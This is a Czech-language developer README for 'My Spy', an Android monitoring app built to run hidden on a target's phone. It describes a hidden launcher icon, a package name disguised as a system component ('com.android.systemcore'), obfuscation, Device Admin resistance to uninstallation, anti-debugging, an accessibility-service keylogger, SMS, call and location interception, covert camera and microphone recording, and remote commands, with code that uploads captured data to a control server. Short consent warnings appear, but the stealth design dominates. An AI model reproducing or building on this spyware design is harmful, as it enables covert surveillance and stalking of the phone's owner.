# My Spy - Mobilní Aplikace (Android)

**Modul:** Mobilní Aplikace Android
**Autor:** Michael KOJDL
**Verze:** 1.0.0
**Poslední revize:** 2025-10-30
**Android Studio:** 2025.1.4
**Min SDK:** Android 12 (API 31)
**Target SDK:** Android 14 (API 34)

---

## Obsah

1. [Přehled](#přehled)
2. [Architektura modulu](#architektura-modulu)
3. [Technické požadavky](#technické-požadavky)
4. [Moduly a komponenty](#moduly-a-komponenty)
5. [Instalace a konfigurace](#instalace-a-konfigurace)
6. [API Komunikace](#api-komunikace)
7. [Bezpečnost](#bezpečnost)
8. [Build a Deployment](#build-a-deployment)

---

## Přehled

Mobilní aplikace My Spy je komplexní monitorovací řešení pro Android zařízení. Aplikace běží ve stealth režimu a poskytuje širokou škálu monitorovacích funkcí s modulární architekturou.

### Klíčové vlastnosti

- ✅ **Stealth mode** - Aplikace neviditelná pro běžného uživatele
- ✅ **Modulární architektura** - Moduly lze zapínat/vypínat z webu
- ✅ **Real-time komunikace** - WebSocket + REST API
- ✅ **Šifrovaná komunikace** - End-to-end encryption
- ✅ **Ochrana před odinstalací** - Device Admin API
- ✅ **Offline režim** - Lokální ukládání dat při nedostupnosti sítě

---

## Architektura modulu

### Architektura aplikace

```
┌─────────────────────────────────────────────────────────┐
│                   My Spy Android App                     │
├─────────────────────────────────────────────────────────┤
│                                                           │
│  ┌──────────────────────────────────────────────────┐   │
│  │           Application Core                        │   │
│  │  - App Singleton                                  │   │
│  │  - Dependency Injection (Hilt/Dagger)            │   │
│  │  - Configuration Manager                          │   │
│  └──────────────────────────────────────────────────┘   │
│                         │                                 │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │          Communication Layer                      │   │
│  │  - API Client (Retrofit)                         │   │
│  │  - WebSocket Client (OkHttp3)                    │   │
│  │  - Authentication Handler                         │   │
│  └──────────────────────────────────────────────────┘   │
│                         │                                 │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │          Data Layer                              │   │
│  │  - Room Database                                 │   │
│  │  - Shared Preferences (Encrypted)                │   │
│  │  - File Storage (Encrypted)                      │   │
│  └──────────────────────────────────────────────────┘   │
│                         │                                 │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │          Service Layer                           │   │
│  │  - Foreground Service (hlavní)                   │   │
│  │  - Work Manager (periodické úlohy)               │   │
│  │  - Job Scheduler (fallback)                      │   │
│  └──────────────────────────────────────────────────┘   │
│                         │                                 │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │          Monitoring Modules                      │   │
│  │                                                   │   │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐      │   │
│  │  │   SMS    │  │  Calls   │  │   GPS    │      │   │
│  │  └──────────┘  └──────────┘  └──────────┘      │   │
│  │                                                   │   │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐      │   │
│  │  │   Apps   │  │ Internet │  │ Keylogger│      │   │
│  │  └──────────┘  └──────────┘  └──────────┘      │   │
│  │                                                   │   │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐      │   │
│  │  │  Screen  │  │  Media   │  │   Files  │      │   │
│  │  └──────────┘  └──────────┘  └──────────┘      │   │
│  └──────────────────────────────────────────────────┘   │
│                         │                                 │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │          Security Layer                          │   │
│  │  - Encryption/Decryption                         │   │
│  │  - Certificate Pinning                           │   │
│  │  - Root Detection                                │   │
│  │  - Anti-Tamper                                   │   │
│  └──────────────────────────────────────────────────┘   │
│                                                           │
└─────────────────────────────────────────────────────────┘
```

### Struktura balíčků

```
com.myspy.android/
├── app/                          # Application & DI
│   ├── App.kt                    # Application class
│   ├── di/                       # Dependency Injection
│   └── config/                   # Configuration
│
├── core/                         # Core funkcionality
│   ├── base/                     # Base classes
│   ├── utils/                    # Utility classes
│   ├── constants/                # Konstanty
│   └── extensions/               # Kotlin extensions
│
├── data/                         # Data layer
│   ├── local/                    # Local storage
│   │   ├── db/                   # Room database
│   │   ├── prefs/                # SharedPreferences
│   │   └── files/                # File storage
│   ├── remote/                   # Remote API
│   │   ├── api/                  # API interfaces
│   │   ├── websocket/            # WebSocket
│   │   └── models/               # Data models
│   └── repository/               # Repositories
│
├── domain/                       # Domain layer
│   ├── models/                   # Domain models
│   ├── usecases/                 # Use cases
│   └── repository/               # Repository interfaces
│
├── services/                     # Services
│   ├── MainService.kt            # Hlavní Foreground Service
│   ├── SyncService.kt            # Synchronizační service
│   └── workers/                  # WorkManager workers
│
├── modules/                      # Monitoring moduly
│   ├── base/                     # Base module class
│   ├── sms/                      # SMS monitoring
│   ├── calls/                    # Calls monitoring
│   ├── location/                 # GPS tracking
│   ├── apps/                     # App usage
│   ├── internet/                 # Browser history
│   ├── keylogger/                # Keylogger
│   ├── screen/                   # Screenshots/recording
│   ├── media/                    # Camera/audio
│   ├── files/                    # File browser
│   └── remote/                   # Remote control
│
├── receivers/                    # Broadcast Receivers
│   ├── BootReceiver.kt           # Boot completed
│   ├── SmsReceiver.kt            # SMS received
│   ├── CallReceiver.kt           # Phone state
│   └── AdminReceiver.kt          # Device Admin
│
├── security/                     # Bezpečnost
│   ├── encryption/               # Encryption utils
│   ├── auth/                     # Authentication
│   ├── antiroot/                 # Root detection
│   └── antitamper/               # Anti-tampering
│
└── ui/                          # UI (minimální)
    ├── hidden/                   # Skrytá aktivita pro nastavení
    └── chat/                     # My Spy Chat
```

---

## Technické požadavky

### Build Environment

- **Android Studio**: 2025.1.4 nebo vyšší
- **Gradle**: 8.5+
- **Kotlin**: 1.9.0+
- **Java**: 17+

### Android Requirements

- **Min SDK**: 31 (Android 12)
- **Target SDK**: 34 (Android 14)
- **Compile SDK**: 34

### Klíčové knihovny

#### Networking
```gradle
// Retrofit - REST API
implementation 'com.squareup.retrofit2:retrofit:2.9.0'
implementation 'com.squareup.retrofit2:converter-gson:2.9.0'

// OkHttp - HTTP client & WebSocket
implementation 'com.squareup.okhttp3:okhttp:4.12.0'
implementation 'com.squareup.okhttp3:logging-interceptor:4.12.0'
```

#### Database
```gradle
// Room - Local database
implementation 'androidx.room:room-runtime:2.6.1'
implementation 'androidx.room:room-ktx:2.6.1'
kapt 'androidx.room:room-compiler:2.6.1'
```

#### Background Processing
```gradle
// WorkManager
implementation 'androidx.work:work-runtime-ktx:2.9.0'

// Foreground Service
implementation 'androidx.core:core-ktx:1.12.0'
```

#### Dependency Injection
```gradle
// Hilt
implementation 'com.google.dagger:hilt-android:2.48'
kapt 'com.google.dagger:hilt-compiler:2.48'
```

#### Security
```gradle
// Encryption
implementation 'androidx.security:security-crypto:1.1.0-alpha06'

// Certificate Pinning (built into OkHttp)
```

#### Permissions
```gradle
// Permission handling
implementation 'com.google.accompanist:accompanist-permissions:0.33.2-alpha'
```

### Požadovaná oprávnění

```xml
<!-- Network -->
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

<!-- SMS & Calls -->
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.CALL_PHONE" />
<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />

<!-- Location -->
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />

<!-- Storage -->
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />

<!-- Camera & Audio -->
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />

<!-- App Usage -->
<uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
    tools:ignore="ProtectedPermissions" />

<!-- Accessibility (pro keylogger) -->
<uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
    tools:ignore="ProtectedPermissions" />

<!-- Device Admin -->
<uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"
    tools:ignore="ProtectedPermissions" />

<!-- Foreground Service -->
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

<!-- Boot -->
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

<!-- WiFi & Bluetooth -->
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
<uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
<uses-permission android:name="android.permission.BLUETOOTH" />
<uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
<uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
```

---

## Moduly a komponenty

### 1. SMS Module

**Soubory:**
- `modules/sms/SmsModule.kt`
- `modules/sms/SmsRepository.kt`
- `modules/sms/SmsMonitor.kt`
- `receivers/SmsReceiver.kt`

**Funkce:**
- ✅ Monitoring příchozích SMS
- ✅ Monitoring odchozích SMS
- ✅ Čtení SMS historie
- ✅ Editace/mazání SMS
- ✅ Odeslání SMS (remote)

**Parametry:**
```kotlin
data class SmsModuleConfig(
    val enabled: Boolean = true,
    val monitorIncoming: Boolean = true,
    val monitorOutgoing: Boolean = true,
    val uploadInterval: Long = 300000, // 5 min
    val maxBatchSize: Int = 100
)
```

**Závislosti:**
- `READ_SMS`, `SEND_SMS`, `RECEIVE_SMS` permissions
- Room Database
- API Client

**Poslední revize:** 2025-10-30

---

### 2. Calls Module

**Soubory:**
- `modules/calls/CallsModule.kt`
- `modules/calls/CallsRepository.kt`
- `modules/calls/CallsMonitor.kt`
- `receivers/CallReceiver.kt`

**Funkce:**
- ✅ Monitoring příchozích hovorů
- ✅ Monitoring odchozích hovorů
- ✅ Zaznamenávání délky hovoru
- ✅ Čtení call log historie
- ✅ Uskutečnění hovoru (remote)
- ✅ USSD kódy (remote)

**Parametry:**
```kotlin
data class CallsModuleConfig(
    val enabled: Boolean = true,
    val monitorIncoming: Boolean = true,
    val monitorOutgoing: Boolean = true,
    val uploadInterval: Long = 300000, // 5 min
    val maxBatchSize: Int = 100
)
```

**Závislosti:**
- `READ_CALL_LOG`, `READ_PHONE_STATE`, `CALL_PHONE` permissions
- Room Database
- API Client

**Poslední revize:** 2025-10-30

---

### 3. Location Module

**Soubory:**
- `modules/location/LocationModule.kt`
- `modules/location/LocationRepository.kt`
- `modules/location/LocationTracker.kt`

**Funkce:**
- ✅ GPS tracking
- ✅ Network location fallback
- ✅ Geocoding (adresa z GPS)
- ✅ KML export příprava
- ✅ Výpočet rychlosti a vzdálenosti

**Parametry:**
```kotlin
data class LocationModuleConfig(
    val enabled: Boolean = true,
    val updateInterval: Long = 600000, // 10 min
    val minDistance: Float = 50f, // 50 metrů
    val highAccuracy: Boolean = true,
    val uploadInterval: Long = 300000 // 5 min
)
```

**Závislosti:**
- `ACCESS_FINE_LOCATION`, `ACCESS_BACKGROUND_LOCATION` permissions
- Google Play Services Location (optional)
- Room Database
- API Client

**Poslední revize:** 2025-10-30

---

### 4. Apps Module

**Soubory:**
- `modules/apps/AppsModule.kt`
- `modules/apps/AppsRepository.kt`
- `modules/apps/AppsMonitor.kt`

**Funkce:**
- ✅ Monitoring spuštěných aplikací
- ✅ Čas strávený v aplikacích
- ✅ App usage statistics
- ✅ Blokování aplikací (remote)

**Parametry:**
```kotlin
data class AppsModuleConfig(
    val enabled: Boolean = true,
    val checkInterval: Long = 60000, // 1 min
    val uploadInterval: Long = 600000, // 10 min
    val blockedApps: List<String> = emptyList()
)
```

**Závislosti:**
- `PACKAGE_USAGE_STATS` permission
- Accessibility Service (pro blokování)
- Room Database
- API Client

**Poslední revize:** 2025-10-30

---

### 5. Internet Module

**Soubory:**
- `modules/internet/InternetModule.kt`
- `modules/internet/InternetRepository.kt`
- `modules/internet/BrowserMonitor.kt`

**Funkce:**
- ✅ Browser history monitoring
- ✅ Bookmarks monitoring
- ✅ Blokování URL (VPN service)

**Parametry:**
```kotlin
data class InternetModuleConfig(
    val enabled: Boolean = true,
    val uploadInterval: Long = 600000, // 10 min
    val blockedDomains: List<String> = emptyList(),
    val useVpn: Boolean = false // Pro blokování
)
```

**Závislosti:**
- Read browser databases (Chrome, Firefox, atd.)
- VPN Service (pro blokování - optional)
- Room Database
- API Client

**Chybové hlášky:**
- `ERROR_BROWSER_ACCESS_DENIED` - Nelze přistoupit k browser databázi
- `ERROR_VPN_PERMISSION_DENIED` - VPN permission nebyla udělena

**TODO:**
- [ ] Podpora více prohlížečů
- [ ] SSL pinning bypass detection

**Poslední revize:** 2025-10-30

---

### 6. Keylogger Module

**Soubory:**
- `modules/keylogger/KeyloggerModule.kt`
- `modules/keylogger/KeyloggerRepository.kt`
- `modules/keylogger/KeyloggerService.kt` (Accessibility Service)

**Funkce:**
- ✅ Záznam text input
- ✅ Context tracking (aplikace, okno)
- ✅ Touch events
- ✅ Click tracking

**Parametry:**
```kotlin
data class KeyloggerModuleConfig(
    val enabled: Boolean = false, // Default OFF
    val uploadInterval: Long = 900000, // 15 min
    val excludeApps: List<String> = listOf("com.android.settings"),
    val trackTouches: Boolean = true
)
```

**Závislosti:**
- `BIND_ACCESSIBILITY_SERVICE` permission
- Accessibility Service enabled
- Room Database
- API Client

**Chybové hlášky:**
- `ERROR_ACCESSIBILITY_NOT_ENABLED` - Accessibility service není aktivní
- `ERROR_ACCESSIBILITY_PERMISSION_DENIED` - Permission byla odepřena

**⚠️ UPOZORNĚNÍ:** Tento modul je invazivní. Používat pouze se souhlasem!

**Poslední revize:** 2025-10-30

---

### 7. Screen Module

**Soubory:**
- `modules/screen/ScreenModule.kt`
- `modules/screen/ScreenRepository.kt`
- `modules/screen/ScreenCaptureService.kt`

**Funkce:**
- ✅ Screenshots
- ✅ Screen recording
- ✅ Periodický záznam
- ✅ Event-based záznam (při otevření app)
- ✅ Touch tracking overlay

**Parametry:**
```kotlin
data class ScreenModuleConfig(
    val enabled: Boolean = true,
    val screenshotInterval: Long = 0, // 0 = disabled
    val screenshotOnAppLaunch: List<String> = emptyList(),
    val recordingEnabled: Boolean = false,
    val recordingMaxDuration: Long = 300000, // 5 min
    val drawTouches: Boolean = true,
    val quality: Int = 80 // 0-100
)
```

**Závislosti:**
- MediaProjection API
- WRITE_EXTERNAL_STORAGE permission
- Room Database
- API Client

**Chybové hlášky:**
- `ERROR_MEDIA_PROJECTION_DENIED` - MediaProjection permission odepřena
- `ERROR_STORAGE_FULL` - Nedostatek místa pro uložení

**TODO:**
- [ ] Implementovat kompresi videa
- [ ] Optimalizace battery drain

**Poslední revize:** 2025-10-30

---

### 8. Media Module

**Soubory:**
- `modules/media/MediaModule.kt`
- `modules/media/MediaRepository.kt`
- `modules/media/CameraCapture.kt`
- `modules/media/AudioRecorder.kt`

**Funkce:**
- ✅ Camera capture (přední/zadní)
- ✅ Audio recording
- ✅ Video recording
- ✅ Plánované nahrávání
- ✅ Event-based capture

**Parametry:**
```kotlin
data class MediaModuleConfig(
    val enabled: Boolean = true,
    val cameraEnabled: Boolean = true,
    val audioEnabled: Boolean = true,
    val cameraType: CameraType = CameraType.BACK,
    val audioQuality: AudioQuality = AudioQuality.MEDIUM,
    val maxRecordingDuration: Long = 600000, // 10 min
    val schedule: List<TimeRange> = emptyList(),
    val triggerOnScreenOff: Boolean = false,
    val triggerOnLocked: Boolean = false
)

enum class CameraType { FRONT, BACK }
enum class AudioQuality { LOW, MEDIUM, HIGH }
```

**Závislosti:**
- `CAMERA`, `RECORD_AUDIO` permissions
- Camera2 API
- MediaRecorder
- Room Database
- API Client

**Chybové hlášky:**
- `ERROR_CAMERA_IN_USE` - Kamera je používána jinou aplikací
- `ERROR_RECORDING_FAILED` - Nahrávání selhalo
- `ERROR_MICROPHONE_IN_USE` - Mikrofon je používán

**⚠️ UPOZORNĚNÍ:** Tento modul může být považován za špionážní! Používat jen s přímým souhlasem!

**Poslední revize:** 2025-10-30

---

### 9. Files Module (Remote File Browser)

**Soubory:**
- `modules/files/FilesModule.kt`
- `modules/files/FilesRepository.kt`
- `modules/files/FileSystemProvider.kt`
- `modules/files/WebDAVHandler.kt`

**Funkce:**
- ✅ File browsing (internal + SD card)
- ✅ File operations (copy, move, delete, rename)
- ✅ Directory operations (create, delete)
- ✅ File attributes (chown, chmod, lsattr, chattr)
- ✅ Upload/Download přes WebSocket
- ✅ WebDAV protocol implementation

**Parametry:**
```kotlin
data class FilesModuleConfig(
    val enabled: Boolean = true,
    val allowDelete: Boolean = true,
    val allowModify: Boolean = true,
    val allowUpload: Boolean = true,
    val allowDownload: Boolean = true,
    val maxUploadSize: Long = 100 * 1024 * 1024, // 100 MB
    val allowedPaths: List<String> = listOf("/sdcard", "/storage")
)
```

**Závislosti:**
- `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE` permissions
- `MANAGE_EXTERNAL_STORAGE` permission (Android 11+)
- WebSocket Client
- Room Database (pro queue)

**API Operace:**
```kotlin
// List directory
GET /files/list?path=/sdcard

// Download file
GET /files/download?path=/sdcard/file.txt

// Upload file
POST /files/upload

// File operations
POST /files/operation
{
  "operation": "copy|move|delete|rename",
  "source": "/sdcard/file.txt",
  "destination": "/sdcard/backup/file.txt"
}

// Change attributes
POST /files/attributes
{
  "path": "/sdcard/file.txt",
  "chmod": "644",
  "chown": "1000:1000"
}
```

**Chybové hlášky:**
- `ERROR_PERMISSION_DENIED` - Nedostatečná oprávnění
- `ERROR_PATH_NOT_FOUND` - Cesta neexistuje
- `ERROR_OPERATION_FAILED` - Operace selhala
- `ERROR_STORAGE_FULL` - Nedostatek místa

**TODO:**
- [ ] Implementovat resume pro velké soubory
- [ ] Přidat progress tracking
- [ ] Optimalizovat upload/download pro pomalá připojení

**Poslední revize:** 2025-10-30

---

### 10. Remote Control Module

**Soubory:**
- `modules/remote/RemoteModule.kt`
- `modules/remote/RemoteRepository.kt`
- `modules/remote/CommandExecutor.kt`

**Funkce:**
- ✅ Self-destruct
- ✅ Black Display
- ✅ Frozen Display
- ✅ WiFi control
- ✅ Bluetooth control
- ✅ Remote lock/unlock

**Parametry:**
```kotlin
data class RemoteModuleConfig(
    val enabled: Boolean = true,
    val allowSelfDestruct: Boolean = true,
    val allowDisplayControl: Boolean = true,
    val allowNetworkControl: Boolean = true
)
```

**Commands:**
```kotlin
sealed class RemoteCommand {
    object SelfDestruct : RemoteCommand()
    data class BlackDisplay(val enabled: Boolean) : RemoteCommand()
    data class FrozenDisplay(val enabled: Boolean) : RemoteCommand()
    data class WifiControl(val enabled: Boolean) : RemoteCommand()
    data class BluetoothControl(val enabled: Boolean) : RemoteCommand()
    data class LockDevice(val pin: String?) : RemoteCommand()
}
```

**Závislosti:**
- Device Admin API
- `CHANGE_WIFI_STATE`, `BLUETOOTH_ADMIN` permissions
- WebSocket Client (pro real-time commands)

**Chybové hlášky:**
- `ERROR_DEVICE_ADMIN_NOT_ACTIVE` - Device Admin není aktivní
- `ERROR_COMMAND_EXECUTION_FAILED` - Příkaz selhal

**⚠️ KRITICKÉ UPOZORNĚNÍ:** Self-destruct je nevratná operace!

**Poslední revize:** 2025-10-30

---

## Instalace a konfigurace

### Prerekvizity

1. Android Studio 2025.1.4+
2. Android SDK 31+
3. Git

### Kroky instalace

#### 1. Clone repository
```bash
git clone git@github.com:m5ike/m5spy_app.git
cd m5spy_app/MobilApp
```

#### 2. Otevřít v Android Studio
```
File → Open → vybrat MobilApp/app
```

#### 3. Konfigurace API endpoints

Upravit `app/src/main/java/com/myspy/android/core/constants/ApiConstants.kt`:

```kotlin
object ApiConstants {
    const val API_BASE_URL = "https://api.myspy.fir.ma/api/v1/"
    const val WSS_BASE_URL = "wss://wss.myspy.fir.ma/"

    // Certificate pins (aktualizovat podle vašeho certifikátu)
    val CERTIFICATE_PINS = arrayOf(
        "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
    )
}
```

#### 4. Build konfigurace

`app/build.gradle.kts`:

```kotlin
android {
    namespace = "com.myspy.android"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.android.systemcore" // Maskování!
        minSdk = 31
        targetSdk = 34
        versionCode = 1
        versionName = "1.0.0"
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
        }
    }
}
```

#### 5. ProGuard konfigurace

`app/proguard-rules.pro`:

```proguard
# Obfuscation
-repackageclasses 'com.android.systemcore'
-allowaccessmodification
-overloadaggressively

# Keep Retrofit
-keepattributes Signature, InnerClasses, EnclosingMethod
-keepattributes RuntimeVisibleAnnotations, RuntimeVisibleParameterAnnotations
-keepclassmembers,allowshrinking,allowobfuscation interface * {
    @retrofit2.http.* <methods>;
}

# Keep Room
-keep class * extends androidx.room.RoomDatabase
-keep @androidx.room.Entity class *
```

#### 6. Build APK

```bash
# Debug build
./gradlew assembleDebug

# Release build (s podpisem)
./gradlew assembleRelease
```

---

## API Komunikace

### Registrace zařízení (První spuštění)

```kotlin
// Request
data class RegisterDeviceRequest(
    val manufacturer: String,
    val model: String,
    val serial: String,
    val os: String,
    val osVersion: String,
    val imei: String,
    val uuid: String
)

// Response
data class RegisterDeviceResponse(
    val result: String,
    val uuid: String,
    val apiKey: String,
    val timestamp: String,
    val version: String
)

// Usage
val request = RegisterDeviceRequest(
    manufacturer = Build.MANUFACTURER,
    model = Build.MODEL,
    serial = Build.SERIAL,
    os = "Android",
    osVersion = Build.VERSION.RELEASE,
    imei = getImei(), // Získat IMEI
    uuid = UUID.randomUUID().toString()
)

val response = apiClient.registerDevice(request)
// Uložit uuid a apiKey do encrypted SharedPreferences
```

### Autentizace následných requestů

```kotlin
// Interceptor pro přidání auth headers
class AuthInterceptor(
    private val prefsManager: PrefsManager
) : Interceptor {
    override fun intercept(chain: Interceptor.Chain): Response {
        val uuid = prefsManager.getUuid()
        val apiKey = prefsManager.getApiKey()

        val request = chain.request().newBuilder()
            .addHeader("X-Device-UUID", uuid)
            .addHeader("X-API-Key", apiKey)
            .addHeader("Content-Type", "application/json")
            .build()

        return chain.proceed(request)
    }
}
```

### WebSocket komunikace

```kotlin
class WebSocketClient(
    private val okHttpClient: OkHttpClient,
    private val prefsManager: PrefsManager
) {
    private var webSocket: WebSocket? = null

    fun connect() {
        val uuid = prefsManager.getUuid()
        val url = "${ApiConstants.WSS_BASE_URL}device/$uuid"

        val request = Request.Builder()
            .url(url)
            .addHeader("X-API-Key", prefsManager.getApiKey())
            .build()

        webSocket = okHttpClient.newWebSocket(request, webSocketListener)
    }

    private val webSocketListener = object : WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            // Připojeno
        }

        override fun onMessage(webSocket: WebSocket, text: String) {
            // Příjem zprávy (např. remote command)
            handleRemoteCommand(text)
        }

        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            // Chyba připojení - retry logic
        }
    }
}
```

### Upload dat

```kotlin
// SMS data
data class SmsData(
    val type: String, // "incoming" | "outgoing"
    val address: String,
    val body: String,
    val timestamp: Long,
    val threadId: Int
)

// API call
suspend fun uploadSmsData(data: List<SmsData>) {
    apiClient.uploadSms(UploadSmsRequest(data))
}
```

---

## Bezpečnost

### 1. Šifrování local dat

```kotlin
// Encrypted SharedPreferences
val masterKey = MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build()

val encryptedPrefs = EncryptedSharedPreferences.create(
    context,
    "secure_prefs",
    masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)
```

### 2. Certificate Pinning

```kotlin
val certificatePinner = CertificatePinner.Builder()
    .add("api.myspy.fir.ma", "sha256/AAAA...")
    .add("wss.myspy.fir.ma", "sha256/BBBB...")
    .build()

val okHttpClient = OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build()
```

### 3. Root Detection

```kotlin
object RootDetector {
    fun isRooted(): Boolean {
        return checkBuildTags() ||
               checkSuBinary() ||
               checkRootApps() ||
               checkRootCloaking()
    }

    private fun checkSuBinary(): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su"
        )
        return paths.any { File(it).exists() }
    }
}
```

### 4. Anti-Debug

```kotlin
object AntiDebug {
    fun detectDebugger(): Boolean {
        return Debug.isDebuggerConnected() ||
               checkDebugBuildConfig() ||
               checkTracerPid()
    }

    private fun checkTracerPid(): Boolean {
        try {
            val status = File("/proc/self/status").readText()
            val tracerPid = status.lines()
                .find { it.startsWith("TracerPid:") }
                ?.substringAfter(":")
                ?.trim()
                ?.toInt() ?: 0
            return tracerPid != 0
        } catch (e: Exception) {
            return false
        }
    }
}
```

### 5. Self-Destruct Implementation

```kotlin
object SelfDestruct {
    suspend fun execute(context: Context) {
        // 1. Smazat všechna lokální data
        deleteAllDatabases(context)
        deleteAllPreferences(context)
        deleteAllFiles(context)

        // 2. Smazat cache
        context.cacheDir.deleteRecursively()

        // 3. Odhlásit Device Admin
        unregisterDeviceAdmin(context)

        // 4. Odinstalovat aplikaci
        uninstallSelf(context)
    }

    private fun uninstallSelf(context: Context) {
        val intent = Intent(Intent.ACTION_DELETE).apply {
            data = Uri.parse("package:${context.packageName}")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(intent)
    }
}
```

---

## Build a Deployment

### Signing konfigurace

`app/build.gradle.kts`:

```kotlin
android {
    signingConfigs {
        create("release") {
            storeFile = file("../keystore/myspy-release.jks")
            storePassword = System.getenv("KEYSTORE_PASSWORD")
            keyAlias = "myspy"
            keyPassword = System.getenv("KEY_PASSWORD")
        }
    }

    buildTypes {
        release {
            signingConfig = signingConfigs.getByName("release")
        }
    }
}
```

### Build release APK

```bash
export KEYSTORE_PASSWORD="your_password"
export KEY_PASSWORD="your_key_password"
./gradlew assembleRelease
```

### Distribuce

APK se nachází v:
```
app/build/outputs/apk/release/app-release.apk
```

### Testing

```bash
# Unit testy
./gradlew test

# Instrumentation testy
./gradlew connectedAndroidTest

# Lint check
./gradlew lint
```

---

## Troubleshooting

### Problem: Aplikace je viditelná v launcheru

**Řešení:** Zkontrolovat AndroidManifest.xml - aktivita nesmí mít LAUNCHER intent filter

### Problem: Permissions nejsou udělovány

**Řešení:** Runtime permissions - implementovat request flow

### Problem: WebSocket se nepřipojuje

**Řešení:**
1. Zkontrolovat certificate pinning
2. Zkontrolovat network security config
3. Zkontrolovat firewall

### Problem: Background service je killován

**Řešení:**
1. Implementovat Foreground Service
2. Přidat do battery optimization whitelist
3. Použít WorkManager pro kritické úlohy

---

## Changelog

### Version 1.0.0 (2025-10-30)
- ✨ Iniciální verze dokumentace
- ✨ Kompletní specifikace všech modulů
- ✨ API dokumentace
- ✨ Bezpečnostní guidelines

---

**Autor:** Michael KOJDL
**Poslední aktualizace:** 2025-10-30
**Verze:** 1.0.0
